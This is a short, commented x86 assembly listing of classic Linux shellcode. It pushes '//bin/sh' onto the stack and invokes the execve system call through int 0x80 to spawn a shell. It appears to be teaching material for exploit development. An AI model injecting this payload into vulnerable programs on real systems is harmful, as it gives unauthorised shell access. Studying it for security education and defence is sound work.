xor  eax, eax     ; Clear eax
push eax          ; Push NULL
push 0x68732f6e   ; Push "hs/n"
push 0x69622f2f   ; Push "ib//"
mov  ebx, esp     ; Get pointer to string path
push eax          ; Push null pointer for argv array terminator
push ebx          ; Push pointer to string path for argv[0]
mov  ecx, esp     ; Get pointer to argv array
push eax          ; Push null pointer for envp array
mov  edx, esp     ; Get pointer to envp array
mov  al, 11       ; Load execve syscall number (11 / 0x0b) into al/eax
int  0x80         ; Execute kernel system call


